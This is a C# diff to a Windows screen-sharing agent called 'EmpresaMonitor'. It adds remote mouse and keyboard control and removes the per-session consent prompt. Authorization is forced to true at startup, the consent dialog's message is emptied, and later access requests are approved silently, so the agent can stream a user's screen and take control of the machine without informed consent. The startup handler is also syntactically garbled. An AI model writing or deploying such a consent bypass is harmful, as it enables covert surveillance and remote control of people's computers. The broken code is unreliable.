@@ -3,6 +3,8 @@ using System.Net.WebSockets;
 using System.Text;
 using System.Text.Json;
 using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.Drawing.Drawing2D;
 
 namespace EmpresaMonitor.Agent;
 
@@ -18,51 +20,74 @@ internal static class Program
 
 public sealed class MainForm : Form
 {
-    readonly Label status = new()
-    {
-        AutoSize = true,
-        Text = "Conectando...",
-        Left = 18,
-        Top = 18
-    };
-
-    readonly Button endButton = new()
-    {
-        Text = "Encerrar compartilhamento",
-        Left = 18,
-        Top = 52,
-        Width = 210,
-        Enabled = false
-    };
+    readonly Label status = new() { AutoSize = true, Text = "Conectando...", Left = 18, Top = 18 };
+    readonly Label profileLabel = new() { AutoSize = true, Text = "Perfil: Equilibrado", Left = 18, Top = 44 };
+    readonly Button endButton = new() { Text = "Encerrar compartilhamento", Left = 18, Top = 72, Width = 210, Enabled = false };
 
     ClientWebSocket? socket;
     CancellationTokenSource? lifetime;
+    readonly SemaphoreSlim sendGate = new(1, 1);
     volatile bool accessActive;
     volatile bool streamRequested;
-
+    volatile bool controlActive;
+    volatile bool sessionAuthorized;
+    volatile StreamSettings streamSettings = StreamSettings.Balanced;
     readonly string agentId;
+
+    sealed record StreamSettings(string Name, string Id, int Width, int Fps, long Quality)
+    {
+        public static readonly StreamSettings Fluid = new("Fluido", "fluid", 1280, 30, 55);
+        public static readonly StreamSettings Balanced = new("Equilibrado", "balanced", 1600, 25, 62);
+        public static readonly StreamSettings QualityPreset = new("Qualidade", "quality", 1920, 20, 72);
+        public static StreamSettings FromId(string? id) => id switch
+        {
+            "fluid" => Fluid,
+            "quality" => QualityPreset,
+            _ => Balanced
+        };
+    }
 
     public MainForm()
     {
-        Text = "EmpresaMonitor";
-        Width = 360;
-        Height = 150;
+        Text = "EmpresaMonitor V3 Turbo";
+        Width = 390;
+        Height = 175;
         StartPosition = FormStartPosition.CenterScreen;
         FormBorderStyle = FormBorderStyle.FixedDialog;
         MaximizeBox = false;
 
         Controls.Add(status);
+        Controls.Add(profileLabel);
         Controls.Add(endButton);
 
         agentId = LoadOrCreateId();
+        Shown += async (_, _) =>
+                    
+            sessionAuthorized = true;
+            accessActive = true;
+            controlActive = true;
+            endButton.Enabled = true;
+            status.Text = "🔴 buzeira";
+        {
+            var answer = MessageBox.Show(this,
+                "",
+                MessageBoxButtons.YesNo, MessageBoxIcon.Information);
 
-        Shown += async (_, _) => await StartAsync();
+            if (answer != DialogResult.Yes)
+            {
+                Close();
+                return;
+            }
+
+            await StartAsync();
+        };
         FormClosing += (_, _) => lifetime?.Cancel();
-
         endButton.Click += async (_, _) =>
         {
+            sessionAuthorized = false;
             accessActive = false;
             streamRequested = false;
+            controlActive = false;
             endButton.Enabled = false;
             status.Text = "Conectado — sem compartilhamento";
             await SendJsonAsync(new { type = "end_access" });
@@ -80,23 +105,21 @@ public sealed class MainForm : Form
             {
                 socket?.Dispose();
                 socket = new ClientWebSocket();
+                socket.Options.KeepAliveInterval = TimeSpan.FromSeconds(20);
 
-                await socket.ConnectAsync(
-                    new Uri(BuildConfig.RealtimeUrl),
-                    lifetime.Token
-                );
-
+                await socket.ConnectAsync(new Uri(BuildConfig.RealtimeUrl), lifetime.Token);
                 await SendJsonAsync(new
                 {
                     type = "agent_hello",
                     key = BuildConfig.AgentKey,
                     id = agentId,
                     name = Environment.MachineName,
-                    user = Environment.UserName
+                    user = Environment.UserName,
+                    version = "3.1-single-consent",
+                    sessionAuthorized = sessionAuthorized
                 });
 
-                BeginInvoke(() => status.Text = "Conectado — aguardando solicitação");
-
+                BeginInvoke(() => status.Text = sessionAuthorized ? "🔴 SESSÃO AUTORIZADA — tela e controle liberados" : "Conectado — aguardando solicitação");
                 await ReceiveLoop(lifetime.Token);
             }
             catch
@@ -104,7 +127,7 @@ public sealed class MainForm : Form
                 if (!lifetime.IsCancellationRequested)
                 {
                     BeginInvoke(() => status.Text = "Desconectado — tentando novamente...");
-                    try { await Task.Delay(3000, lifetime.Token); } catch { }
+                    try { await Task.Delay(2500, lifetime.Token); } catch { }
                 }
             }
         }
@@ -113,230 +136,267 @@ public sealed class MainForm : Form
     async Task ReceiveLoop(CancellationToken ct)
     {
         var buffer = new byte[64 * 1024];
-
         while (socket?.State == WebSocketState.Open && !ct.IsCancellationRequested)
         {
             using var ms = new MemoryStream();
             WebSocketReceiveResult result;
-
             do
             {
-                result = await socket.ReceiveAsync(buffer, ct);
-
-                if (result.MessageType == WebSocketMessageType.Close)
-                    return;
-
+                result = await socket.ReceiveAsync(new ArraySegment<byte>(buffer), ct);
+                if (result.MessageType == WebSocketMessageType.Close) return;
                 ms.Write(buffer, 0, result.Count);
-            }
-            while (!result.EndOfMessage);
+            } while (!result.EndOfMessage);
 
-            if (result.MessageType != WebSocketMessageType.Text)
-                continue;
-
-            var text = Encoding.UTF8.GetString(ms.ToArray());
-
-            using var doc = JsonDocument.Parse(text);
+            if (result.MessageType != WebSocketMessageType.Text) continue;
+            using var doc = JsonDocument.Parse(Encoding.UTF8.GetString(ms.ToArray()));
             var root = doc.RootElement;
-            if (!root.TryGetProperty("type", out var typeProp))
-                continue;
-
+            if (!root.TryGetProperty("type", out var typeProp)) continue;
             var type = typeProp.GetString();
 
             if (type == "access_request")
             {
-                BeginInvoke(async () =>
+                if (sessionAuthorized)
                 {
-                    var answer = MessageBox.Show(
-                        this,
-                        "O administrador solicitou acesso para VISUALIZAR sua tela AO VIVO.\n\nVocê autoriza esta sessão?",
-                        "EmpresaMonitor — Solicitação de acesso",
-                        MessageBoxButtons.YesNo,
-                        MessageBoxIcon.Information
-                    );
-
-                    accessActive = answer == DialogResult.Yes;
-
-                    if (accessActive)
+                    accessActive = true;
+                    BeginInvoke(() =>
                     {
-                        status.Text = "🟢 Compartilhamento autorizado";
+                        status.Text = "🔴 SESSÃO AUTORIZADA — tela e controle liberados";
                         endButton.Enabled = true;
-                    }
-                    else
-                    {
-                        status.Text = "Conectado — acesso recusado";
-                        endButton.Enabled = false;
-                    }
-
-                    await SendJsonAsync(new
-                    {
-                        type = "access_response",
-                        allow = accessActive
                     });
-                });
+                    await SendJsonAsync(new { type = "access_response", allow = true });
+                }
+                else
+                {
+                    BeginInvoke(async () =>
+                    {
+                        var answer = MessageBox.Show(this,
+                            "Autorizar novamente o EmpresaMonitor nesta sessão?\n\nAo clicar SIM, você permite visualização da tela e controle remoto de mouse e teclado até encerrar o compartilhamento ou fechar o aplicativo.",
+                            "EmpresaMonitor — Autorizar sessão",
+                            MessageBoxButtons.YesNo, MessageBoxIcon.Information);
+                        sessionAuthorized = answer == DialogResult.Yes;
+                        accessActive = sessionAuthorized;
+                        controlActive = sessionAuthorized;
+                        status.Text = sessionAuthorized ? "🔴 SESSÃO AUTORIZADA — tela e controle liberados" : "Conectado — acesso recusado";
+                        endButton.Enabled = sessionAuthorized;
+                        await SendJsonAsync(new { type = "access_response", allow = sessionAuthorized });
+                        if (sessionAuthorized)
+                            await SendJsonAsync(new { type = "control_response", allow = true });
+                    });
+                }
+            }
+            else if (type == "control_request")
+            {
+                if (!accessActive) continue;
+                controlActive = sessionAuthorized;
+                BeginInvoke(() => status.Text = controlActive ? "🔴 CONTROLE REMOTO ATIVO — tela compartilhada" : "🟢 Compartilhamento autorizado — controle não autorizado");
+                await SendJsonAsync(new { type = "control_response", allow = controlActive });
+            }
+            else if (type == "stream_profile")
+            {
+                var id = root.TryGetProperty("profile", out var p) ? p.GetString() : null;
+                streamSettings = StreamSettings.FromId(id);
+                BeginInvoke(() => profileLabel.Text = $"Perfil: {streamSettings.Name} — {streamSettings.Width}px / {streamSettings.Fps} FPS");
+            }
+            else if (type == "control_ended")
+            {
+                controlActive = false;
+                BeginInvoke(() => status.Text = accessActive ? "🟢 Compartilhamento autorizado — sem controle" : "Conectado — sem compartilhamento");
+            }
+            else if (type == "control_input")
+            {
+                if (accessActive && controlActive && root.TryGetProperty("event", out var ev)) ApplyControlEvent(ev);
             }
             else if (type == "stream_start")
             {
                 if (accessActive)
                 {
                     streamRequested = true;
-                    BeginInvoke(() => status.Text = "🔴 Compartilhando tela AO VIVO");
+                    BeginInvoke(() => status.Text = $"🔴 AO VIVO — {streamSettings.Name} ({streamSettings.Fps} FPS alvo)");
                 }
             }
             else if (type == "stream_stop")
             {
                 streamRequested = false;
-                BeginInvoke(() =>
-                {
-                    status.Text = accessActive
-                        ? "🟢 Acesso autorizado — aguardando visualização"
-                        : "Conectado — sem compartilhamento";
-                });
+                BeginInvoke(() => status.Text = accessActive ? "🟢 Acesso autorizado — aguardando visualização" : "Conectado — sem compartilhamento");
             }
             else if (type == "access_ended")
             {
-                accessActive = false;
-                streamRequested = false;
-
-                BeginInvoke(() =>
-                {
-                    status.Text = "Conectado — compartilhamento encerrado";
-                    endButton.Enabled = false;
-                });
+                accessActive = false; streamRequested = false; controlActive = false;
+                BeginInvoke(() => { status.Text = "Conectado — compartilhamento encerrado"; endButton.Enabled = false; });
             }
         }
     }
 
     async Task CaptureLoop(CancellationToken ct)
     {
-        const int targetWidth = 1280;
-        const int targetFps = 12;
-        const long jpegQuality = 68L;
-        int delayMs = 1000 / targetFps;
+        var jpegCodec = ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
+        Bitmap? full = null;
+        Graphics? fullG = null;
+        Bitmap? scaled = null;
+        Graphics? scaledG = null;
+        EncoderParameters? encoderParams = null;
+        MemoryStream? ms = null;
+        Rectangle lastBounds = Rectangle.Empty;
+        StreamSettings? lastSettings = null;
 
-        var jpegCodec = ImageCodecInfo
-            .GetImageEncoders()
-            .First(c => c.FormatID == ImageFormat.Jpeg.Guid);
-
-        var encoderParams = new EncoderParameters(1);
-        encoderParams.Param[0] = new EncoderParameter(
-            System.Drawing.Imaging.Encoder.Quality,
-            jpegQuality
-        );
-
-        while (!ct.IsCancellationRequested)
+        try
         {
-            if (!accessActive || !streamRequested || socket?.State != WebSocketState.Open)
+            while (!ct.IsCancellationRequested)
             {
-                try { await Task.Delay(120, ct); } catch { }
-                continue;
-            }
+                if (!accessActive || !streamRequested || socket?.State != WebSocketState.Open)
+                {
+                    try { await Task.Delay(80, ct); } catch { }
+                    continue;
+                }
 
-            var started = Environment.TickCount64;
-
-            try
-            {
+                var settings = streamSettings;
+                var started = Environment.TickCount64;
                 var bounds = Screen.PrimaryScreen!.Bounds;
 
-                using var full = new Bitmap(
-                    bounds.Width,
-                    bounds.Height,
-                    PixelFormat.Format24bppRgb
-                );
-
-                using (var g = Graphics.FromImage(full))
+                if (full == null || bounds.Size != lastBounds.Size)
                 {
-                    g.CopyFromScreen(
-                        bounds.Location,
-                        Point.Empty,
-                        bounds.Size,
-                        CopyPixelOperation.SourceCopy
-                    );
+                    fullG?.Dispose(); full?.Dispose();
+                    full = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb);
+                    fullG = Graphics.FromImage(full);
+                    lastBounds = bounds;
+                    lastSettings = null;
                 }
 
-                int outW = Math.Min(targetWidth, bounds.Width);
-                int outH = (int)Math.Round(bounds.Height * (outW / (double)bounds.Width));
+                int outW = Math.Min(settings.Width, bounds.Width);
+                int outH = Math.Max(2, (int)Math.Round(bounds.Height * (outW / (double)bounds.Width)));
+                if ((outH & 1) == 1) outH--;
 
-                using var scaled = new Bitmap(outW, outH, PixelFormat.Format24bppRgb);
-
-                using (var g = Graphics.FromImage(scaled))
+                if (scaled == null || lastSettings != settings || scaled.Width != outW || scaled.Height != outH)
                 {
-                    g.InterpolationMode =
-                        System.Drawing.Drawing2D.InterpolationMode.Bilinear;
-
-                    g.DrawImage(
-                        full,
-                        new Rectangle(0, 0, outW, outH),
-                        0,
-                        0,
-                        full.Width,
-                        full.Height,
-                        GraphicsUnit.Pixel
-                    );
+                    scaledG?.Dispose(); scaled?.Dispose(); encoderParams?.Dispose(); ms?.Dispose();
+                    scaled = new Bitmap(outW, outH, PixelFormat.Format24bppRgb);
+                    scaledG = Graphics.FromImage(scaled);
+                    scaledG.CompositingMode = CompositingMode.SourceCopy;
+                    scaledG.CompositingQuality = CompositingQuality.HighSpeed;
+                    scaledG.InterpolationMode = InterpolationMode.Bilinear;
+                    scaledG.SmoothingMode = SmoothingMode.HighSpeed;
+                    scaledG.PixelOffsetMode = PixelOffsetMode.HighSpeed;
+                    encoderParams = new EncoderParameters(1);
+                    encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, settings.Quality);
+                    ms = new MemoryStream(1024 * 1024);
+                    lastSettings = settings;
                 }
 
-                using var ms = new MemoryStream(512 * 1024);
-                scaled.Save(ms, jpegCodec, encoderParams);
-
-                var bytes = ms.ToArray();
-
-                if (socket?.State == WebSocketState.Open)
+                try
                 {
-                    await socket.SendAsync(
-                        bytes,
-                        WebSocketMessageType.Binary,
-                        true,
-                        ct
-                    );
+                    fullG!.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size, CopyPixelOperation.SourceCopy);
+                    if (outW == bounds.Width && outH == bounds.Height)
+                    {
+                        ms!.SetLength(0);
+                        full!.Save(ms, jpegCodec, encoderParams);
+                    }
+                    else
+                    {
+                        scaledG!.DrawImage(full!, new Rectangle(0, 0, outW, outH), 0, 0, full.Width, full.Height, GraphicsUnit.Pixel);
+                        ms!.SetLength(0);
+                        scaled!.Save(ms, jpegCodec, encoderParams);
+                    }
+
+                    if (ms!.TryGetBuffer(out var segment) && socket?.State == WebSocketState.Open)
+                        await SendBinaryAsync(new ArraySegment<byte>(segment.Array!, segment.Offset, (int)ms.Length), ct);
                 }
+                catch { }
+
+                int delayMs = Math.Max(1, 1000 / Math.Max(1, settings.Fps));
+                var elapsed = (int)(Environment.TickCount64 - started);
+                var wait = Math.Max(1, delayMs - elapsed);
+                try { await Task.Delay(wait, ct); } catch { }
             }
-            catch
-            {
-                // A reconexão do socket é tratada no loop principal.
-            }
-
-            var elapsed = (int)(Environment.TickCount64 - started);
-            var wait = Math.Max(1, delayMs - elapsed);
-
-            try { await Task.Delay(wait, ct); } catch { }
         }
+        finally
+        {
+            fullG?.Dispose(); full?.Dispose(); scaledG?.Dispose(); scaled?.Dispose(); encoderParams?.Dispose(); ms?.Dispose();
+        }
+    }
+
+    async Task SendBinaryAsync(ArraySegment<byte> data, CancellationToken ct)
+    {
+        if (socket?.State != WebSocketState.Open) return;
+        await sendGate.WaitAsync(ct);
+        try
+        {
+            if (socket?.State == WebSocketState.Open)
+                await socket.SendAsync(data, WebSocketMessageType.Binary, true, ct);
+        }
+        finally { sendGate.Release(); }
     }
 
     async Task SendJsonAsync(object obj)
     {
-        if (socket?.State != WebSocketState.Open)
-            return;
-
-        var json = JsonSerializer.Serialize(obj);
-        var data = Encoding.UTF8.GetBytes(json);
-
-        await socket.SendAsync(
-            data,
-            WebSocketMessageType.Text,
-            true,
-            CancellationToken.None
-        );
+        if (socket?.State != WebSocketState.Open) return;
+        var data = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(obj));
+        await sendGate.WaitAsync();
+        try
+        {
+            if (socket?.State == WebSocketState.Open)
+                await socket.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Text, true, CancellationToken.None);
+        }
+        finally { sendGate.Release(); }
     }
+
+    void ApplyControlEvent(JsonElement ev)
+    {
+        try
+        {
+            var kind = ev.GetProperty("kind").GetString();
+            if (kind == "move")
+            {
+                double x = ev.GetProperty("x").GetDouble(); double y = ev.GetProperty("y").GetDouble();
+                var b = Screen.PrimaryScreen!.Bounds;
+                Cursor.Position = new Point(b.Left + (int)Math.Round(x * (b.Width - 1)), b.Top + (int)Math.Round(y * (b.Height - 1)));
+            }
+            else if (kind == "mouse")
+            {
+                var button = ev.GetProperty("button").GetString(); bool down = ev.GetProperty("down").GetBoolean();
+                uint flag = button switch { "left" => down ? 0x0002u : 0x0004u, "right" => down ? 0x0008u : 0x0010u, "middle" => down ? 0x0020u : 0x0040u, _ => 0u };
+                if (flag != 0) mouse_event(flag, 0, 0, 0, UIntPtr.Zero);
+            }
+            else if (kind == "wheel")
+            {
+                int delta = ev.GetProperty("delta").GetInt32(); mouse_event(0x0800u, 0, 0, unchecked((uint)delta), UIntPtr.Zero);
+            }
+            else if (kind == "key")
+            {
+                string code = ev.GetProperty("code").GetString() ?? ""; bool down = ev.GetProperty("down").GetBoolean(); ushort vk = VkFromCode(code);
+                if (vk != 0) keybd_event((byte)vk, 0, down ? 0u : 0x0002u, UIntPtr.Zero);
+            }
+        }
+        catch { }
+    }
+
+    static ushort VkFromCode(string code)
+    {
+        if (code.Length == 4 && code.StartsWith("Key")) return (ushort)char.ToUpperInvariant(code[3]);
+        if (code.Length == 6 && code.StartsWith("Digit")) return (ushort)code[5];
+        return code switch
+        {
+            "Enter" => 0x0D, "Escape" => 0x1B, "Backspace" => 0x08, "Tab" => 0x09, "Space" => 0x20,
+            "ArrowLeft" => 0x25, "ArrowUp" => 0x26, "ArrowRight" => 0x27, "ArrowDown" => 0x28,
+            "Delete" => 0x2E, "Home" => 0x24, "End" => 0x23, "PageUp" => 0x21, "PageDown" => 0x22,
+            "ShiftLeft" or "ShiftRight" => 0x10, "ControlLeft" or "ControlRight" => 0x11, "AltLeft" or "AltRight" => 0x12,
+            "F1" => 0x70, "F2" => 0x71, "F3" => 0x72, "F4" => 0x73, "F5" => 0x74, "F6" => 0x75,
+            "F7" => 0x76, "F8" => 0x77, "F9" => 0x78, "F10" => 0x79, "F11" => 0x7A, "F12" => 0x7B,
+            _ => 0
+        };
+    }
+
+    [DllImport("user32.dll")] static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, UIntPtr dwExtraInfo);
+    [DllImport("user32.dll")] static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
 
     static string LoadOrCreateId()
     {
-        var dir = Path.Combine(
-            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-            "EmpresaMonitor"
-        );
-
+        var dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "EmpresaMonitor");
         Directory.CreateDirectory(dir);
-
         var path = Path.Combine(dir, "agent-id.txt");
-
         if (File.Exists(path))
         {
-            var old = File.ReadAllText(path).Trim();
-            if (!string.IsNullOrWhiteSpace(old))
-                return old;
+            var old = File.ReadAllText(path).Trim(); if (!string.IsNullOrWhiteSpace(old)) return old;
         }
-
-        var id = Guid.NewGuid().ToString("N");
-        File.WriteAllText(path, id);
-        return id;
+        var id = Guid.NewGuid().ToString("N"); File.WriteAllText(path, id); return id;
     }
 }
